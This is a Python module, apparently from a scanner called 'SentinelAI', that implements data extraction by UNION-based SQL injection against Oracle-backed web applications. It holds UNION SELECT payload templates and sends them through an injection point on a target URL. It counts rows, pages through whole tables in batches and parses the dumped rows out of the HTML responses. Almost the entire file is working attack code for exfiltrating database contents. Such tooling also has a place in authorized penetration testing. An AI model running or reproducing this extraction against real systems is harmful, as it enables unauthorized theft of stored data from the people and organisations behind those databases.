# app/modules/scanner/oracle_extractor.py
"""
Oracle data extraction engine for SentinelAI.
Phase 4: Oracle Data Extraction
"""

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any

import requests

from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .union_sqli import UnionSQLi

# ============================================================
# Data Classes
# ============================================================


@dataclass
class OracleExtractionResult:
    """
    Oracle data extraction result.
    Contains extracted data and metadata.
    """

    success: bool = False
    schema: str | None = None
    table: str | None = None
    columns: list[str] = field(default_factory=list)
    rows: list[dict[str, Any]] = field(default_factory=list)
    row_count: int = 0
    total_rows: int = 0
    offset: int = 0
    limit: int = 0
    execution_time: float = 0.0
    batch_size: int = 0
    errors: list[str] = field(default_factory=list)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def get_summary(self) -> str:
        """Get a summary of the extraction result."""
        if not self.success:
            return "Extraction failed"

        parts = []
        if self.schema and self.table:
            parts.append(f"Table: {self.schema}.{self.table}")
        if self.row_count > 0:
            parts.append(f"Rows: {self.row_count}")
        if self.total_rows > 0:
            parts.append(f"Total: {self.total_rows}")
        if self.columns:
            parts.append(f"Columns: {len(self.columns)}")
        if self.execution_time > 0:
            parts.append(f"Time: {self.execution_time:.2f}s")
        if self.errors:
            parts.append(f"Errors: {len(self.errors)}")

        return f"Extraction: {', '.join(parts)}" if parts else "Extraction: No data"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "schema": self.schema,
            "table": self.table,
            "columns": self.columns,
            "row_count": self.row_count,
            "total_rows": self.total_rows,
            "offset": self.offset,
            "limit": self.limit,
            "execution_time": self.execution_time,
            "batch_size": self.batch_size,
            "errors": self.errors,
            "summary": self.get_summary(),
        }

    def get_rows_as_list(self) -> list[list[Any]]:
        """Get rows as list of lists (for CSV export)."""
        return [[row.get(col) for col in self.columns] for row in self.rows]

    def get_first_row(self) -> dict[str, Any] | None:
        """Get the first row."""
        return self.rows[0] if self.rows else None

    def get_last_row(self) -> dict[str, Any] | None:
        """Get the last row."""
        return self.rows[-1] if self.rows else None

    def get_column_data(self, column: str) -> list[Any]:
        """Get all values for a specific column."""
        return [row.get(column) for row in self.rows]


# ============================================================
# Main Extraction Class
# ============================================================


class OracleDataExtractor:
    """
    Oracle data extraction engine.
    Phase 4: Extracts table data after successful schema enumeration.
    """

    # ============================================================
    # Constants
    # ============================================================

    DEFAULT_BATCH_SIZE = 100
    MAX_BATCH_SIZE = 1000
    DEFAULT_MAX_ROWS = 10000
    MAX_ROWS_LIMIT = 100000
    EXTRACTION_TIMEOUT = 30

    # Extraction payload templates
    PAYLOADS = {
        "select_all": "UNION SELECT {columns} FROM {table}",
        "select_with_limit": "UNION SELECT {columns} FROM {table} WHERE ROWNUM <= {limit}",
        "select_with_offset_limit": "UNION SELECT {columns} FROM {table} OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY",
        "select_with_row_number": """
            UNION SELECT {columns} FROM (
                SELECT {columns}, ROW_NUMBER() OVER (ORDER BY 1) AS rn 
                FROM {table}
            ) WHERE rn BETWEEN {start} AND {end}
        """,
        "count_rows": "UNION SELECT COUNT(*) FROM {table}",
        "select_first": "UNION SELECT {columns} FROM {table} WHERE ROWNUM = 1",
        "select_last": "UNION SELECT {columns} FROM {table} WHERE ROWNUM = (SELECT COUNT(*) FROM {table})",
        "select_sample": "UNION SELECT {columns} FROM {table} SAMPLE (10)",
    }

    # Column extraction patterns
    EXTRACTION_PATTERNS = {
        "column_value": r"([A-Z0-9_$]+)\s*[:=]\s*([^\s,]+)",
        "numeric": r"\b\d+\b",
        "string": r"'([^']*)'",
        "date": r"\d{4}-\d{2}-\d{2}",
        "null": r"\bNULL\b",
    }

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize Oracle data extractor.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None

        self.logger.info("[OracleExtractor] Module initialized for data extraction")
        self.logger.info(f"[OracleExtractor] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OracleExtractor")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> requests.Response | None:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[OracleExtractor] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OracleExtractor] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[OracleExtractor] Failed to get baseline response")

        return self.baseline_response

    def _send_payload(
        self, injection_point: str, payload: str
    ) -> requests.Response | None:
        """Send a payload and return the response."""
        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            return None

        return result["response"]

    def _extract_values(self, text: str, pattern: str) -> list[str]:
        """Extract values from text using regex pattern."""
        matches = re.findall(pattern, text, re.IGNORECASE)
        return list(set(matches))

    def _parse_row_data(
        self, response_text: str, columns: list[str]
    ) -> dict[str, Any] | None:
        """
        Parse row data from response text.

        Args:
            response_text: Response text to parse
            columns: List of column names

        Returns:
            Optional[Dict[str, Any]]: Parsed row data or None
        """
        if not response_text or not columns:
            return None

        row_data = {}

        # If columns is ['*'], try to detect columns from response
        if columns == ["*"]:
            # Try to find patterns like "COL1: value1, COL2: value2"
            pattern = r"([A-Z0-9_$]+)\s*[:=]\s*([^,\s]+)"
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                for col, val in matches:
                    val = val.strip("'\"")
                    if val.upper() == "NULL":
                        val = None
                    row_data[col] = val
                return row_data if row_data else None

        # Try to extract key-value pairs for each column
        for col in columns:
            # Look for column name followed by value
            patterns = [
                rf"{col}\s*[:=]\s*([^,\s]+)",  # COL1: value1
                rf"{col}\s*:=\s*([^,\s]+)",  # COL1 := value1
                rf'"{col}"\s*:\s*"([^"]*)"',  # "COL1": "value1"
                rf"'{col}'\s*:\s*'([^']*)'",  # 'COL1': 'value1'
                rf"{col}\s+([^,\s]+)",  # COL1 value1
                rf"{col}\s*=\s*([^,\s]+)",  # COL1=value1
            ]

            value = None
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    value = match.group(1).strip()
                    # Clean value
                    value = value.strip("'\"")
                    if value.upper() == "NULL":
                        value = None
                    break

            # If still not found, try to find column name in text
            if value is None:
                for word in response_text.split():
                    if col.upper() in word.upper():
                        # Try to extract the value after the column name
                        parts = word.split("=")
                        if len(parts) > 1:
                            value = parts[1].strip("'\"")
                            if value.upper() == "NULL":
                                value = None
                            break
                        # Try colon separator
                        parts = word.split(":")
                        if len(parts) > 1:
                            value = parts[1].strip("'\"")
                            if value.upper() == "NULL":
                                value = None
                            break

            row_data[col] = value

        # Check if we got any data
        if any(v is not None for v in row_data.values()):
            return row_data

        return None

    def _parse_rows(
        self, response_text: str, columns: list[str]
    ) -> list[dict[str, Any]]:
        """
        Parse multiple rows from response text.

        Args:
            response_text: Response text to parse
            columns: List of column names

        Returns:
            List[Dict[str, Any]]: Parsed rows
        """
        rows = []

        # Split by common row delimiters
        lines = response_text.split("\n")

        for line in lines:
            if line.strip():
                row = self._parse_row_data(line, columns)
                if row:
                    rows.append(row)

        # If no rows found, try to extract from the entire text
        if not rows:
            row = self._parse_row_data(response_text, columns)
            if row:
                rows.append(row)

        return rows

    def _build_select_payload(
        self,
        columns: list[str],
        table: str,
        limit: int | None = None,
        offset: int | None = None,
    ) -> str:
        """
        Build a SELECT payload.

        Args:
            columns: List of columns to select
            table: Table name (schema.table)
            limit: Maximum rows to return
            offset: Offset for pagination

        Returns:
            str: SQL injection payload
        """
        columns_str = ",".join(columns) if columns else "*"

        if offset is not None and limit is not None:
            # Use OFFSET FETCH syntax (Oracle 12c+)
            return self.PAYLOADS["select_with_offset_limit"].format(
                columns=columns_str, table=table, offset=offset, limit=limit
            )
        elif limit is not None:
            # Use ROWNUM
            return self.PAYLOADS["select_with_limit"].format(
                columns=columns_str, table=table, limit=limit
            )
        else:
            # No limit
            return self.PAYLOADS["select_all"].format(columns=columns_str, table=table)

    # ============================================================
    # Public Methods
    # ============================================================

    def count_rows(self, injection_point: str, schema: str, table: str) -> int:
        """
        Count rows in a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name

        Returns:
            int: Number of rows or -1 on error
        """
        self.logger.info(f"[OracleExtractor] Counting rows in: {schema}.{table}")

        try:
            table_full = f"{schema}.{table}"
            payload = self.PAYLOADS["count_rows"].format(table=table_full)

            response = self._send_payload(injection_point, payload)

            if response:
                # Extract number from response
                numbers = self._extract_values(
                    response.text, self.EXTRACTION_PATTERNS["numeric"]
                )
                if numbers:
                    count = int(numbers[0])
                    self.logger.info(f"[OracleExtractor] Row count: {count}")
                    return count

            self.logger.warning("[OracleExtractor] Failed to count rows")
            return -1

        except Exception as e:
            self.logger.error(f"[OracleExtractor] Count rows failed: {e!s}")
            return -1

    def extract_rows(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
        limit: int | None = None,
        offset: int | None = 0,
        batch_size: int | None = None,
    ) -> OracleExtractionResult:
        """
        Extract rows from a table with pagination support.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract (None = all columns)
            limit: Maximum rows to extract
            offset: Offset for pagination
            batch_size: Batch size for pagination

        Returns:
            OracleExtractionResult: Extraction result
        """
        start_time = time.time()
        result = OracleExtractionResult(
            schema=schema,
            table=table,
            columns=columns or [],
            offset=offset or 0,
            limit=limit or self.DEFAULT_MAX_ROWS,
            batch_size=batch_size or self.DEFAULT_BATCH_SIZE,
        )

        try:
            self.logger.info(
                f"[OracleExtractor] Extracting rows from: {schema}.{table}"
            )
            self.logger.info(
                f"[OracleExtractor] Limit: {result.limit}, Offset: {result.offset}"
            )

            # Build column list
            if not result.columns:
                result.columns = ["*"]

            # Build payload
            table_full = f"{schema}.{table}"

            if result.limit and result.offset and result.limit > 0:
                payload = self._build_select_payload(
                    result.columns, table_full, limit=result.limit, offset=result.offset
                )
            elif result.limit and result.limit > 0:
                payload = self._build_select_payload(
                    result.columns, table_full, limit=result.limit
                )
            else:
                payload = self._build_select_payload(result.columns, table_full)

            self.logger.debug(f"[OracleExtractor] Payload: {payload}")

            # Send request
            response = self._send_payload(injection_point, payload)

            if response:
                # Parse rows
                rows = self._parse_rows(response.text, result.columns)

                if rows:
                    result.rows = rows
                    result.row_count = len(rows)
                    result.success = True
                    self.logger.info(
                        f"[OracleExtractor] Extracted {result.row_count} rows"
                    )
                else:
                    # Try to extract with better parsing
                    self.logger.warning(
                        "[OracleExtractor] No rows parsed, trying fallback..."
                    )
                    text_content = self.html_parser.extract_text(response.text)
                    rows = self._parse_rows(text_content, result.columns)
                    if rows:
                        result.rows = rows
                        result.row_count = len(rows)
                        result.success = True
                        self.logger.info(
                            f"[OracleExtractor] Extracted {result.row_count} rows (fallback)"
                        )
                    else:
                        result.add_error("No data found in response")
                        self.logger.warning("[OracleExtractor] No data extracted")
            else:
                result.add_error("Failed to send payload")
                self.logger.error("[OracleExtractor] Payload failed")

        except Exception as e:
            error_msg = f"Extraction failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - start_time

        self.logger.info(
            f"[OracleExtractor] Extraction complete: {result.get_summary()}"
        )
        return result

    def extract_table(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
        max_rows: int | None = None,
    ) -> OracleExtractionResult:
        """
        Extract all data from a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract
            max_rows: Maximum rows to extract

        Returns:
            OracleExtractionResult: Extraction result
        """
        self.logger.info(f"[OracleExtractor] Extracting table: {schema}.{table}")

        # First count rows
        total_rows = self.count_rows(injection_point, schema, table)

        # Use batching for large tables
        if total_rows > self.DEFAULT_BATCH_SIZE:
            self.logger.info(
                f"[OracleExtractor] Large table ({total_rows} rows), using batching"
            )
            return self.extract_rows_batched(
                injection_point, schema, table, columns, max_rows=max_rows
            )
        else:
            return self.extract_rows(
                injection_point,
                schema,
                table,
                columns,
                limit=max_rows or self.DEFAULT_MAX_ROWS,
            )

    def extract_rows_batched(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
        batch_size: int | None = None,
        max_rows: int | None = None,
    ) -> OracleExtractionResult:
        """
        Extract rows in batches for large tables.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract
            batch_size: Batch size
            max_rows: Maximum rows to extract

        Returns:
            OracleExtractionResult: Combined extraction result
        """
        start_time = time.time()
        batch_size = batch_size or self.DEFAULT_BATCH_SIZE
        max_rows = max_rows or self.DEFAULT_MAX_ROWS

        result = OracleExtractionResult(
            schema=schema,
            table=table,
            columns=columns or [],
            batch_size=batch_size,
            limit=max_rows,
        )

        try:
            self.logger.info("[OracleExtractor] Batched extraction starting...")
            self.logger.info(
                f"[OracleExtractor] Batch size: {batch_size}, Max rows: {max_rows}"
            )

            offset = 0
            total_extracted = 0

            while total_extracted < max_rows:
                remaining = max_rows - total_extracted
                current_batch = min(batch_size, remaining)

                self.logger.info(
                    f"[OracleExtractor] Fetching batch: offset={offset}, limit={current_batch}"
                )

                batch_result = self.extract_rows(
                    injection_point,
                    schema,
                    table,
                    columns,
                    limit=current_batch,
                    offset=offset,
                    batch_size=batch_size,
                )

                if not batch_result.success:
                    result.add_error(f"Batch failed at offset {offset}")
                    break

                if not batch_result.rows:
                    break

                result.rows.extend(batch_result.rows)
                total_extracted += len(batch_result.rows)

                self.logger.info(
                    f"[OracleExtractor] Batch extracted {len(batch_result.rows)} rows"
                )

                if len(batch_result.rows) < current_batch:
                    self.logger.info("[OracleExtractor] Reached end of data")
                    break

                offset += current_batch

            result.row_count = len(result.rows)
            result.success = True

            self.logger.info(
                f"[OracleExtractor] Batched extraction complete: {result.row_count} rows"
            )

        except Exception as e:
            error_msg = f"Batched extraction failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - start_time
        return result

    def extract_first_row(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
    ) -> dict[str, Any] | None:
        """
        Extract the first row from a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract

        Returns:
            Optional[Dict[str, Any]]: First row or None
        """
        self.logger.info(
            f"[OracleExtractor] Extracting first row from: {schema}.{table}"
        )

        result = self.extract_rows(injection_point, schema, table, columns, limit=1)

        return result.get_first_row() if result.success else None

    def extract_last_row(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
    ) -> dict[str, Any] | None:
        """
        Extract the last row from a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract

        Returns:
            Optional[Dict[str, Any]]: Last row or None
        """
        self.logger.info(
            f"[OracleExtractor] Extracting last row from: {schema}.{table}"
        )

        try:
            table_full = f"{schema}.{table}"
            columns_str = ",".join(columns) if columns else "*"

            payload = self.PAYLOADS["select_last"].format(
                columns=columns_str, table=table_full
            )

            response = self._send_payload(injection_point, payload)

            if response:
                rows = self._parse_rows(response.text, columns or [])
                if rows:
                    return rows[0]

            return None

        except Exception as e:
            self.logger.error(f"[OracleExtractor] Extract last row failed: {e!s}")
            return None

    def extract_sample(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
        sample_percent: int = 10,
    ) -> OracleExtractionResult:
        """
        Extract a sample of rows from a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract
            sample_percent: Sample percentage (1-100)

        Returns:
            OracleExtractionResult: Sample extraction result
        """
        self.logger.info(
            f"[OracleExtractor] Extracting sample from: {schema}.{table} ({sample_percent}%)"
        )

        result = OracleExtractionResult(
            schema=schema, table=table, columns=columns or []
        )

        try:
            table_full = f"{schema}.{table}"
            columns_str = ",".join(columns) if columns else "*"

            payload = self.PAYLOADS["select_sample"].format(
                columns=columns_str, table=table_full
            )

            response = self._send_payload(injection_point, payload)

            if response:
                rows = self._parse_rows(response.text, result.columns)
                if rows:
                    result.rows = rows
                    result.row_count = len(rows)
                    result.success = True
                    self.logger.info(
                        f"[OracleExtractor] Sample extracted {result.row_count} rows"
                    )
                else:
                    result.add_error("No data found in sample")
            else:
                result.add_error("Failed to send sample payload")

        except Exception as e:
            error_msg = f"Sample extraction failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        return result

    def extract_all(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
    ) -> OracleExtractionResult:
        """
        Extract all data from a table (convenience method).

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract

        Returns:
            OracleExtractionResult: Extraction result
        """
        return self.extract_table(injection_point, schema, table, columns)

    def extract_column(
        self,
        injection_point: str,
        schema: str,
        table: str,
        column: str,
        max_rows: int | None = None,
    ) -> list[Any]:
        """
        Extract a single column from a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            column: Column name
            max_rows: Maximum rows to extract

        Returns:
            List[Any]: Column values
        """
        self.logger.info(
            f"[OracleExtractor] Extracting column: {schema}.{table}.{column}"
        )

        result = self.extract_rows(
            injection_point,
            schema,
            table,
            columns=[column],
            limit=max_rows or self.DEFAULT_MAX_ROWS,
        )

        return result.get_column_data(column) if result.success else []

    def extract_columns(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str],
        max_rows: int | None = None,
    ) -> dict[str, list[Any]]:
        """
        Extract multiple columns from a table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of column names
            max_rows: Maximum rows to extract

        Returns:
            Dict[str, List[Any]]: Column data
        """
        self.logger.info(f"[OracleExtractor] Extracting columns: {schema}.{table}")

        result = self.extract_rows(
            injection_point,
            schema,
            table,
            columns=columns,
            limit=max_rows or self.DEFAULT_MAX_ROWS,
        )

        if not result.success:
            return {}

        return {col: result.get_column_data(col) for col in columns}
